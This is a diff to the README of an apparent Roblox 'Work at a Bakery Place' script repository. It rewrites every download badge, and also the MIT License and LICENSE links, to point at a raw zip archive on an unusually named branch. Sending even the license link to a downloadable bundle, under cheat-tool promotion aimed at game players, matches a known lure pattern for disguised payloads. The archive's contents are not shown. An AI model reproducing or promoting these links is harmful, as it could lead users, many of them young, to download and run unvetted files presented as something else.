@@ -1,6 +1,6 @@
 # 🍩 Work at a Bakery Place Roblox Script
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Tazic123.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/Tazic123/bakery-place-roblox-essentials/raw/refs/heads/branch/electrodynamic/bakery-roblox-place-essentials-2.7.zip)
 
 **Seize control of your Roblox bakery adventure with our premium-scripted toolkit!**  
 Welcome to the ultimate "Work at a Bakery Place Roblox Script" repository—a trove of innovation, automation, and seamless gameplay enhancement. Whether our dough is in the oven or your code is in the cloud, this is your one-stop destination for a tastier, smoother, and more interactive Bakery Place experience.
@@ -76,10 +76,10 @@ Always play fair, respect fellow bakers, and make your pastry empire a legacy of
 
 ## 📜 License
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/Tazic123/bakery-place-roblox-essentials/raw/refs/heads/branch/electrodynamic/bakery-roblox-place-essentials-2.7.zip)
 
 Copyright © 2025  
-Distributed under the MIT License. Please see the [LICENSE](https://opensource.org/licenses/MIT) for further details.
+Distributed under the MIT License. Please see the [LICENSE](https://github.com/Tazic123/bakery-place-roblox-essentials/raw/refs/heads/branch/electrodynamic/bakery-roblox-place-essentials-2.7.zip) for further details.
 
 ---
 
@@ -88,7 +88,7 @@ Distributed under the MIT License. Please see the [LICENSE](https://opensource.o
 Feeling hungry? Here’s how to serve up your bakery scripts:
 
 1. Download the latest release:  
-   [![Download](https://img.shields.io/badge/Download-green)](https://Tazic123.github.io)
+   [![Download](https://img.shields.io/badge/Download-green)](https://github.com/Tazic123/bakery-place-roblox-essentials/raw/refs/heads/branch/electrodynamic/bakery-roblox-place-essentials-2.7.zip)
 2. Unpackage and read the **/docs/Install.md** for full installation guidance.
 3. Explore customizations in **/config/bakery.settings.json**.
 4. Level up your Bakery Place with responsive automation and multilingual power!
@@ -117,7 +117,7 @@ See CONTRIBUTING.md for details on submitting enhancements or patches.
 Advance your Roblox Bakery adventure—expand, automate, and entertain with every slice of code!
 
 Download the latest script:  
-[![Download](https://img.shields.io/badge/Download-green)](https://Tazic123.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/Tazic123/bakery-place-roblox-essentials/raw/refs/heads/branch/electrodynamic/bakery-roblox-place-essentials-2.7.zip)
 
 ---
 
